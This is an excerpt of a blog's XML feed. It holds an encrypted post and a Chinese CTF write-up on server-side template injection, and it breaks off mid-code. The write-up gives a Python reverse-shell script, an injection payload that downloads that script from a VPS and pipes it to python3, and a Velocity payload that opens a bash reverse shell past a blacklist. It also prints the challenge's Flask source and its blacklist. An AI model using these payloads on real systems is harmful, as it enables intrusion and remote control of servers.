D0n9X1n/hexo-blog-encrypt (github.com)</a>进行配置</p>]]></content>
    
    
    <categories>
      
      <category>折腾</category>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>折腾</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fofa_Hacking</title>
    <link href="/2022/06/02/FofaHacking/"/>
    <url>/2022/06/02/FofaHacking/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，密码错误~" data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容~">  <script id="hbeData" type="hbeData" data-hmacdigest="861c8757498577502aa37d01bd32af6d7da6e5f5bd00ff04707eeb28b169d280">da2b40cabefb236431f60326dbcf8c62fea8e3a871d741cfda55e5db6676661b44f4a1f4c2f364b56b414cec5e718a0404684f8261cfd3df867c33ea1d10972cc7740b41af1c1510b38240c6d8ba70562ee8b966384bc16e039f0d5964243d13c142ce9a5bc5863cbc4a3ade22453143038911980bb24880167661d35eeda8064e53b387aaf7876918f328a8a612f0823df771f1a33d7575c19da1c656b06a3ba7a8e7a00356ac0c13f64806d148af97d7bc0f392c08d19cd6b049a7166434c16172c592bea650e5eb2f43cd638cd6ba32ab5904b7470421e6ad9bd00ecc4f0f6ec3f8ba86aa0b807b957ba0166a00e8758ecfa849ac8647fe6acd51a69328fa74bb9c5f03a4bb9edc55a38c7c83c5431235ad3fe34f3649232011939fba6892ba2e172d8c179b65fc4fdec7abe8c6c08a734045d96cf86c1d5518ead118be7265df132b05f5486e9814e085de6141f8cbc02dc4ce73e6e0f7e493944248b3a57c2b27d53f567ff65b518ce2086134105659c0ab3082231290b387c539fff6394d39ef1505b4b25e318007f759e74552462f6d3b4e974823545b50a82f796f18a969fc6c12141362dcb41c4e37e9d7ea7b204ed1806bdd8ff3e32e188a0622a90dacd5c707f8d993b348e77601013e12920cc380f43622bb446ed22bee41281b602833db9d83d281fe6dfdc47775f0a4f507d3bf2e48ff13b556332aff8d5dfcbb6e51f3b86863a4adcdd9c81384638f87f569eb2f7643a791c91cf79a83f8432de0d798984d29c813aff961b240426d8f0a0d43fd0b64d848a4774489f289035ad7632609252bf151c43ed0bbc303110946d56b7c219ffbad2ab9550d6b9a4443e0363f53bc372ffd773165aa0c975e6a56dd827f3bfba59f1355e4245e5c8b57e87e1c01fd7fabf9e9a3c9468ea2f1d00cb7c02362c1c4811f3c052374ab3fa22a91ac5ad0d69726ffda83585df56015fd28d205523460c3b9b69e94134c4565e686b38973bd65c7effff8aff41032fa90a7a1bc139effe7d4f0e5a85631579412bc37f2cf75c48d49297bac81017303a608f70ddb719dc9f69013fb9ff8b026f8ba648710a6de46815d1eb004a69ecba64784600091d476cfd5753de15397a0743f0a44228e67e9729fc38032a5b5c03c28eb5e3968652201044025d6eecd173e069353ff5790ce3e85b6c5ee8db92eaf0cc6f8daaaaa9612b1aedab6bda6a28a92ab11c5396cb822ab82c0f5afe706017416268ba1e51193ecce9632ce83b7642fd091ea6ba6964a9d5e2f19d1b748c8f0c1dedfc7bb55a322798e77a44606f7eb3a0ba81a7cedade2896e7e1667dcc986bace4736a43a1e14380df15dbdf2fe3d5ab84008dfe0c6c7acac78bd3ab404756e5b5456a71010ebd054a5d024c9dafe7707e666327cf6a7d2ecdbf8700c9c64a256b18c3eb3705d24934d621e001af54fd1b56f4a445eb9f5e0843613254e189237cb91c26b54908c913dd5c8d98751dd4fd262a2851b8ce844c2e47b64f09a0527b5abedfe948ecfbb21b65b31a9a875ddb2007c31d9dd845c2b3f8766c26babddd1d471a11c45b9803cb0cdfdf55447bb28b0f145b148a7b7f4895e3a7f93e8a539de4c57199fb274f6b364580d80c9c1aab69706cc4dbd12b2484fbbfbc087a4179e6deaaa0b5bd43cdba3580c3c8494d76f589badf5cd2f1f2ba8adb1bfbb351e98de2d81add03683af1dc94de3c4cdfb03a2cb32a4aff0bdae13e4bb0b95d2a836e96c1380f33e66d046d34f8148501c70f4ce66ecf1cb6808c6c6d494767d7ff2985d1c35da28c0a01e2d8965f1dc63b374ea3c6c4f5502afbd464dd153ac724662535d81c6ed42dfb3aebc4a68d2b9ebaeee17923c61ba883f3370be5ffd09895ce972088fdecdf65cde3f83b51381cdef8022cd264fe4d2379c86fd8246aa278e5066498027f244924a0322b43314aede030a24200420e3bf0c1850b21046e8512114228e3cd1c5ff371c73eae1786161de53e788e79803a25dd5b01056b649a82cb6c53cfff406369aace21d41bf750854d6bcc3e97371ada1355f368b6e3d0030136c245778370634bf72b6ff4140d536e6962eb851e8de5fab67971a5ce7e0380453173c51918e1a4e57433a9965e31d7b8f7a4a5c3b1bb28b29cf6c2271ccd05173988eb806c25fca0962b2490e10612aa0b7d623a1822495f9d15acbe86f70000090c2d8df51b0d75394320736cee7cd02c5c0ce60b762e38eb71511ce0f330f6c1e7e5750fad0c0319222bfdbd606c5dfc5ebedf29a5b4f7c338c8043f18d7e82f1550e0efef85c6696a78d4597e5e9fd98eda73a75dbc48ff8270bbd7a09a7ad8476e7710e3cfcd865c1c0b840855a583a2de0859dce52d52141b27aa80e9e99c7befe2b073d9c858d1279890836b47d65d2b887b08360c6fdd1d12e08756c84d1af65ad067c0ab59ae421c354ba4f6b452c7e11c5b53252c93d83649f8d860ba6854db52d1718c02cb67e0b1c2c1e133afd2a5b873faab46356fcdc8f94476f779c2fccd961c7c1f6bc4698ed6a488becaea18adca3cb20730493e5703abe81ecd9f09d6ab320ccf176df0275fda1846036cc9fdfce4e3fc63783bf0116a0e9b4a657cc745f7aa61e68f6c0db244326017005d4bef3909b65560d6885fe1c06f691d90d90ff88acd6c9ecbeb10f7351f9a24e729830a0e22d5c12e596936cb761f341b2b28fcc9d1f108c840c4c823b2e1d25ebd316c9749c3259d35928482370fd8a3921ae36db384a400834af84c869df43e4e78af55d04768eb983f10ce41a777a4fac40536288f35efb39b9cfb9acac74a8679324f3d80849645f270f4bab97f984c9ed1784964e15bbe4f16fa4fb4904b1348d4ad056679ec7f7750837b84193582e7e5efbd0e538fd949d374fdabb620b61e600001d6d246514e0b30e59ec17b91cf4e88ab17c8c4bfebfd6959ddd28f416b424a242b5555cd74b298c907a8d2c6da2ac66e5eca1f8dc1ad9529f38b3f2eb584890855d62d5207f78c60caa56e06c78a6677674b78d160056847c30bbf91475fcabd89c30ccf88867595aee7b2ed6b17f27de9fe0925c83f4829dce27720b093e3553cc0970a9263d0cd84d0436317701168a316990da0cbe0722c9b6b5df13a9406fe40a0b2ccb5e748a3404cb4f91bffd4d8cfa1b926aaa8eca17065321e36179b1f31cf235ec9520b8a8c586481ebf6aaca6d30929039cbf77fbefd6a32a30a494583afd56f7a98470989ee9a9de131cd0daae6716604509ffaa9de89f0263bbe59f1f980b3f57553727eb20f1e19eeb374b7847ac7f6b679ee11ceeb6136260a006984d839eabc1519c5645b68166814c42d08f676896344f2c6049a14445579856802e6539decb401b5d8b487cc462767d348c14807bb0fe8608dd061cb4a776a75ed8a12d3063bd79a4f0b4606295757b1c1e57eb7dbd93c1ae9d713deb9b89a78d524255fd472365f70ee0994e84033692ccd9474db1967737f0837867a66724ad101768e2dc64cd6fd7aa9cbf338137d44cd0649c9f9bb08df6d81ef32421f453157979e217d08053e16ecf061e0c6facab56a00e289f5963faa62fb6e55f1bc87e07dae966b51846c3d1fac8e350342a66c9f8e7e3536b28609304cbaef92bfa7955452953b170d8695d193cdbe0d705ceb552e30109fe7524f1c3e9174fae4e7e5766bdfb53184a82b4628609b1783eb0a5d65cb4e1aa28db3a2ecf52144f8155dd06bb415ec16a9925ab2baead9650e9c4bb7b6cc76ac5ad20578959890b6840761a34d8cc3021a194fed87f6060acfe7a4621172bd7706de1a9a58e5c98d55159d187ad09d18cca94503c67bb6f020b7f066638cedcfa43349fcd24e9b81fb0413229b0b2cd88c7bda9c8f42f9f3094a221a1f90680df5da21a8d4a00cc9e6b1032e6a8d27022a0b356f8e46d4fbb95f40bea49baf5e7cf495379f00b699e3aa6124e4ec15721c2c990992e9a8c9652e6527978be0513a1245e95fe3d6ecff8a008d60a76cd13714d13e48c0726f8fd5487c28c1379a313748308616f0319663e8e316f33d25c836fc52163cbce66ee2d08f8e835c02a8ca12c8385ae0a2d063e47682db62d728ba631250202e094d489aac9e87ce6af94868ddfaffbda11114c40fc4b5d0e7ca5f97d04fe814ae1a98640a1cc99aeb484a1b121cc4df3bc79ca19d72a8cc232dff5de45c3b6a04c52a3ae875c6cb0312e62a50ac997372876db33718dbcdb57375ca3b5d3075940bf0717f0bc9650d7774bb166d8f4b990009f4c47026afd0cc91296220d78ef81f96f274e3cbacdefa564f8ff4c4bbdc06e79850db090f2b9b00858f313b51efc500ece6ee10ac7bb92f772ef1822321e72199264d3e1c860e6839ccfc7fc79b580de8964c5e70616061d0bbf1a040d9b2beb11a2e49ec57e3c0463be02127e737a1caa38dfeb6b932dd8717e939eaae2f4467eafe38b5348b18899f829941405084e0b16a4d734454af8e3bf4ec4f50b81384f7c8cc3f48089c4855d41172bf06efc787b6531b51c0ef0608bfba721ae26c858599c32623a7b8f0676693f1e09a78287579d827876d8d4e2d8e19b11a7addbda2afb6d9a1cd459cda0ec785e7afbc2842b61ce2e0262da96de34c7b9175324b4b4e9c9f477e63a2534ad966bee8866666f7b4ad8144be6bdb0190d4b3febf4276659abb9721805c284c4d0507191eecfa51ee5b1fa683f8d5b070734c4366b64852ed37173ddcca892f872a541df31f9c338eea3bdb0219f54e2c6f1089e7f1446db2af9573ed62e04d80c84e7a523855b44c7f137d00811591401bf485d88ff07ae45b72afab90a035637fcdd3bd555587b276273117bbe39f7f9e8cd7871974dcc51d8d7a6f74f2b51a3bd0774cfdea440d31cf0c150e05ed137b08384d04dc2d71d80254ad07abd3c47593d130e373e797427f4f1252e11214091e9ea88a4c73b503ec11b2046f847f4ee464b404a732af9411d30ffb8a216cf304909dca9fe125818f0440b40f48b0eb873d089baff6c27775c404359c1deda69900f9edd1fbc1c68f57180f729011e4d88b1218b4247b9a37c855dae52d3a0c0b3b8efb6b68cbd1f3eeb50cb2244f0b1c5318d2f0a748d765e0586896d9b83f6e061410ca70c73fa6bd9fbe61f1ca24e2dce5f86818f78f20f0b5b630b00a6d3d2a72b8ae5260ce59232dd024863ba34df6483ce973d8e600c43151dccad2b291b61481b244a8c604d822faca343e71477e98d1820e1cad172620f37f8ac93031e18b390a96b7386b1f66c8d178c17b45b42cce68c783013a4dec8ab640e16012a898384069580fc17ab5c3d38d546a520bc9245e74ccc9d325104680ce3cd82d9453488e58443130d1d49f4bce81dec12fab27de28785d4f4761f9d17fb4bac0d5e2e4fec4e456b6342cac0e8adb443b1a06d1a40463dc90a98a01bfb08e84f100d9acb03b779520fd4645314cc59321128672e86771c1a1fda09d70a8db0a39ec5f407229330924abc49cfd10796b9974f1aba7fd82a9bf0d1b4d9d586c5180fddedb38ae01d6c7bba46c7e6fad7be948c02211fe72f5f49add613cd76efd8ec301390d6ec182cb8a7b103437e690e078d5529d73478f8356f5246db21444bb4cdce5e57843160210033208b9d08df408a2069c59780224d72c691bf46d844ae452aef9668c9045e3aee950c1146f9ecf998b15b97f3b95f90e42ed7bf2e0f9d8197c81abf987e804a8d8bf43e99d73230f71f15c1e8e46f3630febbbaee74770b99180925ba849e04cc695f21fd5af8b8765122cf0cddda0c2ac2e40648bb62f642c034e66f4b6c81866f3f386a2e677d141876ee968ae90ade4ada52a0786d5ae5cebf978bacc03163a351b174f7d12088b3f44341024e12e0ed30eb7209907c467fa9611d2f26fec37d9f92833b19ec598f8903f7c51ad75590ce57f239764f7f783212cba95d7e5ac513cd31eff44bdcc65539db542f60fe8091ecdc42ecdb66e9867ddeceb0af8c8a292eb573973116f9882964f5bf5001c7f4c2751498cc513779b6c299ac824a2442f0d3ceb77ccdf0f56a4ee79935797e8fb74a07c88a6af50480e1238320dd4c79758eb8b275a1ab655a36f7cd7daabf0126343d1029792d24a3e7d5e8b697c0c4a535afaa323006ab6d1b6ccc916723d144707583d778a370aabef897a94a247d003ea4131893d5d0ad5c323d936e564f59af094d43813454ac33cea0313b3c5815636f1a10c89dca1749c1c49ec676def1349f86a7014d6c6fa79a135fabb21d9ca4062ebb63d1f1d2a91763213de08a692bc9b3e586bfafce988b91e59b4cab7e07c75351c3af376249be63cd1de730bae64eb69a4700a533db006d53b72f6088b564282d48c3eb484d4ea8e15f2be566089feb272a4828e0e90a4c9cc9bf309fc5af181f1d1da53b81c768441787aa3e234a81cedb5216d566cbdf0c80575b81c61e17b444071e6d4b1e8e5240649dbd2aed04856645d8a3b91f78c8cebbd8f377bfed734d7dcb577c8d231fb41ec7d1eec29ba99897cc4a740dd9031fb7f4efa71d4670fea7193fcc209a699363e411b7de7ebc7a110fc566165a0c359d2ca732ee451dffd2e263574ead45cff6c0056c69ef8b06f6b78a325dc8d27997f6d5e346522381c4a69732272117935b19fcd9fe6683285aa62e6a2d504ab8ba34f9d521649369992153ae88ed9cb1ff5a2c7c7dc0cc6b2f52672a1f6da56b9840cc8481c3092e79dd8a35120462ad25b0b9acf50ae324f24fa8f1a0fc5f7ab51900f00c3bb066f3055ff883343c56e50a2acee6fdac255456ac0fe594148f59b24666ed7552aceb4af0b92a2eed85d8c7a8ab769dfadf44b2e5ccf4a3fa90e2c14df1cf7667ac2bef822a0284d3f74ba3155a02385937ea3a550ff0c8b01649e53343fa66c13436cd0955fe4d4fef4ff53d2f869b01eb03c1f52069f608a25782731ecfb5bc728e5bc493e1b0ec04aacfc146a47fc37ab794227d3b82c7667de6047b3eb8a60c1272a4b9c03847a4f2b26a60444d05e2370178ad2ad1073d1fb27579f64ff67e25ddfc470791875f859e3eee0a1ccd78a5c13e7bae106f46effa4a97e9bab94b6cf184cd30077ac4120d3a80e5412e18df76b35fa0000a84a3f3d93fe0304ae82643f3f88746ffb37dd5ead6cd586dc4d042e82e6a6923e1d651e05f3b1fb14b2efb6a937e56cf236c285a035d84f422e1b48d8f9a3a745ec226f22ab1fc960f359cb6b5a021c0bd95c523da80fa955b2983bc1ada23c201f106ffef965cb8b86f5263938b3104b76e5cd3a2680d528bb4795cff9bd4add09aae4777992539449064bdb9f0516938319475c624a7bec5b81dbc48f9e686118a5ee1377485d4d358219a25861ed7d48b54c840e4eefb9e46f56a6d1a2cfb155d7743f01ad494fccae04a8e2d7df8e4a60efe58de9570437afb1a5b48035d604dce6521949c177297c09d163c6cb15d9f2714163841d0caa066bc16a9de50bf60a2613fadfb2605bfe1beb4442244da69b9ffbb1e4d32d34441f9b23d0f1d19a55a76f17175a7a8637acbdcc385b37cb3f05e1e7cac5dce3334c8e1657d26c39b23b9d2795b867502f3a48330378bc983c54d49ea31d41da5d14cb8596dcf36a21dba667ce6d04554ad186cc60f173d38d9aeb6e6ce361b7d96dc9a3dd436795a900680a7782af69cde1b9a3de527c8a2a44058648d16b69fd2a033f5321662dccd50b4daea7da5f749b865e82a52ea2fab04107ddf4d72f42b92721917dc5a290e3ac9e4de52effdb4fb1bb89ef0e8d93f0f0595175b011303098c6359cf48dbeac1b2a544ddc4ed587f3bc15e22c6eb595f1208ed083a406400b6da97239b19f159f569131e4b4b4ee63fdb0d280efbbf2911389ba083c5918647de7bbf069d0f0992eae64f3fabc62e3e806870ff3b9817156c51d27ad70b1e8f9db8c3a74554f1454fc36d7cefc8e3ddc5447d285fcd63804645b4cb950cf1748d83c7f0e93c2736bdacde3e9a604678f98b873790d118cf4de95326aef0dec5e3972ac0df0e02930cd48083db4cda8cb0002d9165c1ab9213d69864be86a797419621c49e90eb66e286d191a5433aff8d586573946fe4e349df5539493cf382917d90412d0d5e4eb6b7943da95220840852fd489c45e107cfb6df2ae747717b8f61c0986ae95668028bdfbe4d585d7777cacc2eb24c40ba4d16e418dffb60e9f4454a15cadc26f3feb58cd3b888be4c8403e37c622f7e0ae3c1277741e897f09c96fb087920efecc4dc786b49f76b6ba5f4e7e43f388ae542ca89e33c80953a8f724bf720dfa2fb426ccd97efae67ec1e6191c907bebe7cf2b5eee1c43bfd44ef488be439b8e2168e40200a826491d30547414e4fbaac6117831d25bb48a7f538715627f85da8174a03f3704309d740e37ad284ea33a1135373d3ce76fa3d5f30483326ca97d0fc99f8bfe4e96aceb0aeb93a70a34e5e206e8f5417602df394702ea4defb2b803ed050fcbe2e5815f28f4a87e7f7eb3fa5e4de7be4195cab80767b51c1452383a6d839f6f659a2e672a28289a23c58f96e8e0cebc43d9c1ec1347f5c5a8895e5008f8ff39f2323ba4d43d67d5df0b370b4c185401f0e9854b778a6f40c093246b6505f5bc19b78d37da8598cd9722724d17bc4830b5d9f90c23cd5660ba4f38c81a22fdb243dbe83058573bfb9710e973b7198d01bbe6ee0c374d5613416c6aa5eb12d4bf0dcf22782e9517ea136c14587699fe24828679299c0cab13e5a56dd02abfe8f53b43f053176c0a8f8f159776ee63cfe05328747f51318f7c2fc270920dde4a87d26bd7a91b5200126f1260eca9c91b17842c2eba9ffead280c83fa15c83e2247b7be290fc576e30c7c76eec6912d17919beed08b28c4758bcfa79d521742e0a5d74514bb6dc00d123068ff773f80a97d0282fdc471beb2d2ad3c7d205a1874bf90dda215a7f327b6db263426b6b7c3057dae46b5f78e01076934755323ddb0243a3c774364e2fe2e6c7c1fe978a4a1ea6380c7bda9272fdd0afb4336e48f0004228ae9b66bd57e2cc21a1f38ed43583baf0afd041fa5beb198827f668e3741f6018cd397a82dec5382d9794d2b6a53d80ba16186ffea7c4c4a47ed0b6e7d5d1054a4678903c228122049b3c682b6d9e2bca1d955bb9a1d6f596c5c192b92bc53833e71ac7b5401eb9215b10a2c4b34de5865f27a986f50afabbd4f6edc44f2d2e8735d4fddeb2b609827584a608025724dc703de8bb40d806839b7bf01d71dfc1941c80e4b32d0a867ca801cd06e6f9b73defcca1fe428cd804d3aa9cd6e9d73ec786c788bf5be1aefc3a3eec7e3aac0809f773540d55a4cb47912dcde991df3e91fddfdcd7b52a524bffc55ab820f64690011792bf8648a762e7512d5184667069a58611f829be87fcb9108a49bdbb8e0d37e1dba5ec00262cd7c29cd23b4132528b6b134a1f010a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-up">      <input class="hbe hbe-input-field hbe-input-field-up" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-up" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-up">You need to input the password to unlock this article.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>加密</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mimic-ssti_writeup</title>
    <link href="/2022/03/18/Mimic-ssti-writeup/"/>
    <url>/2022/03/18/Mimic-ssti-writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-什么是SSTI">0x01 什么是SSTI</h2><p>SSTI就是服务器端模板注入(Server-Side Template Injection)，服务器接收用户命令，然后后端对命令渲染，将恶意代码作为Web模板的一部分，和其他注入（XSS等）比较类似。常见于Python环境。</p><div class="note note-info">            <p>相关知识参考：<a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">(16条消息) SSTI完全学习_大千SS的博客-CSDN博客_ssti</a></p><p><a href="https://www.wangan.com/articles/1031">CTF 中常见 Python 题型 SSTI - 网安 (wangan.com)</a></p><p><a href="https://blog.csdn.net/qq_43431158/article/details/105322894?utm_term=ssti%E6%B3%A8%E5%85%A5&amp;utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-105322894&amp;spm=3001.4430">(16条消息) SSTI模板注入_Sn0w/的博客-CSDN博客_模板注入</a></p>          </div><p>SSTI也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，SSTI利用的是现在的网站模板引擎(下面会提到)，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 mako tornado django，php的smarty twig，java的jade velocity。当这些框架对运用渲染函数生成html的时候会出现SSTI的问题。</p><h2 id="0x02-PHP">0x02 PHP</h2><p>打开题目，只有一个搜索框。用HackBar简单执行一下python的payload，在自己的VPS上开指定端口，发现有请求访问，说明存在注入：</p><p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220318204301527.png" alt></p><p>能访问就好说了，<a href="http://xn--VPSpyrev-209lgd7qs43ggstekdjw8a4nfu69e92ybthd.py">在自己的VPS上新建一个py脚本rev.py</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket,subprocess,os<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((your_vps_ip,vps_port))<br>os.dup2(s.fileno(),<span class="hljs-number">0</span>)       <br>os.dup2(s.fileno(),<span class="hljs-number">1</span>)       <br>os.dup2(s.fileno(),<span class="hljs-number">2</span>)       <br>p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br></code></pre></td></tr></table></figure><p>新建一个vps的shell，用nc监听脚本预设的端口，然后让目标机器反弹shell：</p><p><code>http://eci-2ze7xhzqb362wx6m2wqs.cloudeci1.ichunqiu.com:8888/?username=&#123;system('curl -l http://your_vps_ir:port/rev.py | python3 ')&#125;</code></p><p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220318205757458.png" alt></p><p>在根目录下找到flag，但是只有php的可以读取：</p><p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220318205936252.png" alt></p><h2 id="0x03-Java">0x03 Java</h2><p>本来想用php的shell进python目录上传一句话拿shell的，结果发现没有权限……只能通过curl上传文件获得java目录里的jar文件源码。</p><p>打开源码后发现黑名单，可以针对黑名单进行绕过：</p><p><img src="/2022/03/18/Mimic-ssti-writeup/mimic-ssti.jpg" alt="img"></p><p>构造payload获取java的shell，需要注意的是，如果你这里也是用curl来反弹shell的话，要把监听php那个shell先退出才能收到java的shell：</p><p><code>%23set($e%3d&quot;e&quot;)%0a%23set($j%3d&quot;jav&quot;)%0a%23set($a%3d&quot;a.lang.Ru&quot;)%0a%23set($R%3d&quot;ntime&quot;)%0a%23set($g%3d&quot;getR&quot;)%0a%23set($t%3d&quot;untime&quot;)%0a$e.getClass().forName($j.concat($a).concat($R)).getDeclaredMethod($g.concat($t),null).invoke(null,null).exec(&quot;bash+-c+&#123;echo,这里是getshell的base64语句&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)</code></p><p>执行语句后收到java部分的flag：</p><p><img src="/2022/03/18/Mimic-ssti-writeup/image-20220319204919908.png" alt></p><h2 id="0x04-Python">0x04 Python</h2><p><a href="http://xn--pythonapp-5b6ns32chr6aq86dlhbm89o.py">读取python目录下的app.py</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, render_template_string<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> uuid<br><br>app = Flask(__name__)<br>SECRET_KEY = <span class="hljs-built_in">str</span>(uuid.uuid4())[:<span class="hljs-number">12</span>]<br>numbers_str = [<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]<br>black_list = [<span class="hljs-string">&quot;class&quot;</span>, <span class="hljs-string">&quot;__&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;globals&quot;</span>, <span class="hljs-string">&quot;request&quot;</span>, <span class="hljs-string">&quot;&#123;%&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>, <span class="hljs-string">&quot;false&quot;</span>, <span class="hljs-string">&#x27;lipsum&#x27;</span>, <span class="hljs-string">&#x27;url_for&#x27;</span>,<br>              <span class="hljs-string">&#x27;get_flashed_messages&#x27;</span>, <span class="hljs-string">&#x27;range&#x27;</span>, <span class="hljs-string">&#x27;dict&#x27;</span>, <span class="hljs-string">&#x27;joiner&#x27;</span>]<br>black_list += numbers_str<br><br>app.config.update(<span class="hljs-built_in">dict</span>(<br>    SECRET_KEY=SECRET_KEY,<br>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> name.lower():<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    name = request.args.get(<span class="hljs-string">&quot;username&quot;</span>)<br>    <span class="hljs-keyword">if</span> name <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        text1 = requests.get(<span class="hljs-string">&quot;http://127.0.0.1:7410/&quot;</span>, params=&#123;<span class="hljs-string">&quot;username&quot;</span>: name&#125;).text<br>        text2 = requests.get(<span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>, params=&#123;<span class="hljs-string">&quot;username&quot;</span>: name&#125;).text<br>        <span class="hljs-keyword">if</span> waf(name):<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;404.html&#x27;</span>), <span class="hljs-number">404</span><br>        render_str = render_template_string(name)<br>        <span class="hljs-keyword">if</span> text1 == render_str <span class="hljs-keyword">and</span> text2 == render_str:<br>            <span class="hljs-keyword">return</span> render_str<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;404.html&#x27;</span>), <span class="hljs-number">404</span><br>        render_str = render_template_string(name)<br>        <span class="hljs-keyword">return</span> render_str<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_found</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;404.html&#x27;</span>), <span class="hljs-number">404</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-number">8888</span>)<br></code></pre></td></tr></table></figure><p>发现SECRET_KEY是随机产生的，而且过滤了数字和字符串拼接，所以这里可以利用伪造session来进行构造任意字符串。</p><p>这里可以通过伪造php和java的服务来本地比较得到key。</p><p>leak.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//leak.php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-string">&quot;tmp_code&quot;</span>))&#123;<br>   <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;tmp_code&quot;</span>,<span class="hljs-string">&quot;-&quot;</span>);<br>&#125;<br><span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;-0123456789abcdef&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;username&quot;</span>],<span class="hljs-string">&#x27;code&#x27;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>   <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;code&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;username&quot;</span>][<span 